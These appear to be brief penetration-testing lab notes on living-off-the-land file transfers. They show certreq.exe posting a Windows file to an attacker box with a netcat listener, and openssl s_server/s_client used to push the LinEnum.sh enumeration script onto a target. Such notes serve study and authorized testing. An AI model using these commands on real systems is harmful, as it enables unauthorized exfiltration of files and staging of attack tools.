--------------
# [LOLBAS](https://lolbas-project.github.io/)
-------------------------
### CertReq.exe
- Upload win.ini to Pwnbox
```shell
certreq.exe -Post -config http://$PWNBOX c:\windows\win.ini
```
- PWNBOX
```Bash
sudo nc -lvnp 80
```

------------
# [GTFOBins](https://gtfobins.github.io/)
-----------------
- Create Certificate in PWNBOX
```Shell
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
- Stand up the server in PWNBOX
```Shell
openssl s_Server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
- Download files from $TARGET
```Shell
openssl s_client -connect $TARGET:80 -quiet > LinEnum.sh
```